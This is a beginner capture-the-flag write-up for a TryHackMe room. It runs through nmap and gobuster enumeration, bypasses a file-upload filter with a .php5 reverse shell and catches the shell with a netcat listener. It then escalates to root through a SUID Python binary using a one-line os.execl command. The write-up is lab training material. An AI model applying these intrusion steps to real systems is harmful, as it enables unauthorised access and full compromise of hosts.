# RootMe - THM 
**Description** | A ctf for beginners, can you root me?
 --    | --
**Difficulty** | easy
## nmap scan
```bash
$ nmap -sV  10.10.123.179
  Nmap scan report for 10.10.123.179
  Host is up (0.11s latency).
  Not shown: 998 closed tcp ports (reset)
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
  80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **Notes:** SSH and HTTP are open. I started with the web service because it often provides useful attack paths.


## HTTP
Visit: `http://10.10.123.179`
![alt txet](https://github.com/user-attachments/assets/79162dad-117b-4ab2-950d-111f4a36f747)

## Gobuster

Let's enumerate common directories:
```bash
$ gobuster dir -u http://10.10.123.179 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.                    (Status: 200) [Size: 616]
/.hta                 (Status: 403) [Size: 276]
/.hta.                (Status: 403) [Size: 276]
/.htaccess.           (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.hta.txt             (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/.htpasswd.           (Status: 403) [Size: 276]
/css                  (Status: 301) [Size: 308] [--> http://10.10.123.179/css/]
/index.php            (Status: 200) [Size: 616]
/js                   (Status: 301) [Size: 307] [--> http://10.10.123.179/js/]
/panel                (Status: 301) [Size: 310] [--> http://10.10.123.179/panel/]
/server-status        (Status: 403) [Size: 276]
/uploads              (Status: 301) [Size: 312] [--> http://10.10.123.179/uploads/]
```
> Notes: /panel and /uploads look interesting
## /panel Directory

![alt text](https://github.com/user-attachments/assets/4016356e-ea7a-46cd-beff-98b129749aa2)

### We can uplosd files here. Let's upload a web-shell to get a shell.

you can use this php reverse shell [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
### first, i tried uploading a test file with .php extension to see if it would be accepted. Unfortunately, it was rejected.
![alt text](https://github.com/user-attachments/assets/7e1f6514-0c75-4a63-bf98-11c06715efe3)

 ### After that, I tried changing the extension to .php5, and fortunately, that was successful.
![alt text](https://github.com/user-attachments/assets/c2960494-7412-4211-a981-891a5846ead8)

## /uploads Directory

![alt text](https://github.com/user-attachments/assets/5fa06fee-10f1-4e75-86c9-ad7e2766f07e)

Start a netcat listener from your attack machine.

```bash
$ nc -lvnp 1234
```
You have to visit the PHP URL in order to initiate the connection.
![alt text](https://github.com/user-attachments/assets/514e04dc-e33f-4758-883a-887dcb79be50)

## User flag

know let's search for user.txt flag
```bash
$ find -type f -name 'user.txt' 2>/def/null
/var/www/user.txt
```
![alt text](https://github.com/user-attachments/assets/57d9b7d5-6d40-4a0c-9c89-402657eceea6)

## PRIVILEGE ESCALATION
First we need to search for SUID permissions to escalate our privileges.

```bash
$ find -type f -perm -4000 2>/dev/null
```
![alt text](https://github.com/user-attachments/assets/4204c297-7d2f-4ba9-b9b8-8c616c4c5f2f)

we find the weird file. know we go to [GTFobins](https://gtfobins.github.io/gtfobins/python/#suid) and look for methods to exploit SUID in Python

```bash
bash-5.0$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# whoami
whoami
root
```
![alt text](https://github.com/user-attachments/assets/ea1cf006-5fde-4b50-8faa-74df105dec72)

